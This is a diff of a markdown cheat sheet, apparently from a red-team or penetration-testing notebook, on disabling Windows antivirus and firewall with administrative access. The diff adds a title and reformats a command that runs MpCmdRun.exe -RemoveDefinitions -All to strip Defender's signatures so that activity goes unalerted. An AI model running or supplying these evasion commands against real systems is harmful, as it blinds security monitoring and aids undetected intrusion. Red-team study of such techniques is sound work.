@@ -1,3 +1,5 @@
+# AV and Firewall Disable
+
 ## Disable AV and Firewall with 2 commands
 
 ### Requirements: Administrative/System level access
@@ -24,7 +26,9 @@ OR
 
 # Disable Signature Checks from Defender (Won't kill the AV, but it will not alert any activity because of signature disablement)
 
-#### execute -o cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+#### execute -o 
+
+    cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 
 # AV Features disable
 
